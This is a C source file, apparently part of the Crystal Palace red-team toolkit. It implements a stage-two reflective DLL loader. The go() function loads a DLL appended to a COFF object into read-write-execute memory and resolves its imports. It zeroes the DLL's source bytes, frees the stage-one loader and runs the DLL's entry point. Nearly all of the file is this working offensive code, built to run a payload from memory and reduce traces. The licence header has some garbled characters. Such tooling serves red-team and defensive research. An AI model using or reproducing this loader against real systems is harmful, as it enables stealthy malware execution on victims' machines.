/*
 * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS Ã¢Â€ÂœAS ISÃ¢Â€Â AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
 
#include <windows.h>
#include "tcg.h"
 
WINBASEAPI DECLSPEC_NORETURN VOID WINAPI KERNEL32$ExitThread (DWORD dwExitCode);
 
/*
 * This is the Crystal Palace convention for getting ahold of data linked with this COFF.
 *
 * Notice, we're executing from a COFF context, so we don't need to do any different
 * weirdness between x86 and x64. They'll both work the same here.
 */
char __DLLDATA__[0] __attribute__((section("my_data")));
 
char * findAppendedDLL() {
    return (char *)&__DLLDATA__;
}
 
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;
 
/*
 * Ahhhh.... so MUCH easier than writing PIC
 */
void go(char * stage1ptr) {
    char       * dst;
    _RESOURCE  * dllsrc;
    DLLDATA      data;
    IMPORTFUNCS  funcs;
    DLLMAIN_FUNC entry;
 
    /* find our DLL appended to this COFF */
    dllsrc = (_RESOURCE *)findAppendedDLL();
 
    /* resolve some needed function pointers */
    funcs.GetProcAddress = GetProcAddress;
    funcs.LoadLibraryA   = LoadLibraryA;
 
    /* parse our DLL! */
    ParseDLL(dllsrc->value, &data);
 
    /* allocate memory for it! */
    dst = VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
    /* load the damned thing */
    LoadDLL(&data, dllsrc->value, dst);
 
    /* process the imports */
    ProcessImports(&funcs, &data, dst);
 
    /* grab our entry point, the last info we need from dllsrc */
    entry = ( EntryPoint(&data, dst) );
 
    /* OK, the way I've done things here, our DLL data is LINKED to this COFF and it was put into the RW memory
     * with this COFF's other global variables (and function table too). We can't free() it. But, we can zero it
     * out and that's what we're going to do here. stage1 could have extracted the DLL as a separate resource
     * and then we could have freed that, but I'm playing with making this modular. So, this is what I got. */
    __stosb((unsigned char *)dllsrc->value, 0, dllsrc->length);
 
    /* let's free our Stage 1 too */
    VirtualFree(stage1ptr, 0, MEM_RELEASE);
 
    /* run our DLL */
    entry ((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);
 
    /* and, because we can't "return" to our stage 1, let's exit this thread */
    KERNEL32$ExitThread(0);
}